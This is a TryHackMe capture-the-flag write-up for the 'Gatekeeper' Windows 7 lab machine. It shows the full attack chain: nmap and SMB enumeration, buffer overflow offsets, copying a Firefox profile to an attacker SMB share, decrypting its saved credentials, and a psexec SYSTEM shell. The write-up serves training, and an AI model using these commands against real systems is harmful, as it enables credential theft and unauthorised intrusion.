---
title: "Gatekeeper"
date: 2024-11-17
categories:
  - TryHackMe
  - Windows
tags:
  - TryHackMe
  - Windows
---

# Gatekeeper

<!-- more -->

## Enumeration

```bash
$ nmap -sC -Pn -T4 --min-rate 1000 -p- 10.10.249.16 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 00:47 CET
Nmap scan report for 10.10.249.16
Host is up (0.076s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2024-11-15T22:51:11
|_Not valid after:  2025-05-17T22:51:11
31337/tcp open  Elite
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown
49162/tcp open  unknown

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-16T18:14:30-05:00
| smb2-time: 
|   date: 2024-11-16T23:14:30
|_  start_date: 2024-11-16T22:50:40
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 0
|_clock-skew: mean: 1h04m59s, deviation: 2h53m12s, median: -35m01s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap done: 1 IP address (1 host up) scanned in 195.76 seconds

```

## Initial Access

`nc 10.10.249.16 31337` reveals a program that echoes anything we enter.
If we input a large number of `A`s, it crashes, indicating this is a buffer overflow machine.
We need to retrieve the program, so let's try accessing SMB shares without credentials.

```bash
$ smbclient --no-pass -L //10.10.249.16          
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
                                                                                                                                    
$ smbclient --no-pass //10.10.249.16/Users
Try "help" to get a list of possible commands.
                     
smb: \> ls
  .                                  DR        0  Fri May 15 03:57:08 2020
  ..                                 DR        0  Fri May 15 03:57:08 2020
  Default                           DHR        0  Tue Jul 14 09:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:54:24 2009
  Share                               D        0  Fri May 15 03:58:07 2020

smb: \> cd Share
smb: \Share\> ls
  .                                   D        0  Fri May 15 03:58:07 2020
  ..                                  D        0  Fri May 15 03:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 07:27:17 2020

                7863807 blocks of size 4096. 3984765 blocks available
smb: \Share\> get gatekeeper.exe
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (22.5 KiloBytes/sec) (average 14.9 KiloBytes/sec)
smb: \Share\> exit
```

We have the file. Now, create the exploit on a Win32 machine.

- offset -> `146`
- bad chars -> `0x00`, `0x0A`
- jump address -> `080414C3`

Now we can retrieve the user flag.

## Privilege Escalation

We find a `Firefox.lnk` file in the user's desktop folder, so we attempt to extract credentials from Firefox.
Navigate to `C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles`.

On Kali, create an SMB share with `impacket-smbserver -smb2support -user 'test' -password 'test' kali \`pwd\``.

Copy the profile folder to Kali:

```bash
copy lfjfn812a.default-release z:\
```

Next, install [`firefox_decrypt`](https://github.com/unode/firefox_decrypt):

```bash
git clone https://github.com/unode/firefox_decrypt.git
                                                                                                  
python3 firefox_decrypt.py /home/kali
2024-11-17 17:44:37,595 - WARNING - profile.ini not found in /home/kali
2024-11-17 17:44:37,595 - WARNING - Continuing and assuming '/home/kali' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```

With these credentials, we try `nxc`:

```bash
nxc smb 10.10.92.113 -u 'mayor' -p '8CL7O1N78MdrCIsV'
SMB         10.10.92.113    445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
SMB         10.10.92.113    445    GATEKEEPER       [+] gatekeeper\mayor:8CL7O1N78MdrCIsV (Pwn3d!)
```

Using `impacket-psexec`:

```bash
$ impacket-psexec 'mayor':'8CL7O1N78MdrCIsV'@10.10.92.113 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.92.113.....
[*] Found writable share ADMIN$
[*] Uploading file FMkKbYVP.exe
[*] Opening SVCManager on 10.10.92.113.....
[*] Creating service aYIa on 10.10.92.113.....
[*] Starting service aYIa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## Post Exploitation

```bash
C:\Windows\system32> cd C:\Users\mayor\desktop
 
C:\Users\mayor\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\mayor\Desktop

05/14/2020  08:58 PM    <DIR>          .
05/14/2020  08:58 PM    <DIR>          ..
05/14/2020  08:21 PM                27 root.txt.txt
               1 File(s)             27 bytes
               2 Dir(s)  16,385,642,496 bytes free

C:\Users\mayor\Desktop> type root.txt.txt
{Th3_M4y0r_C0ngr4tul4t3s_U}
```
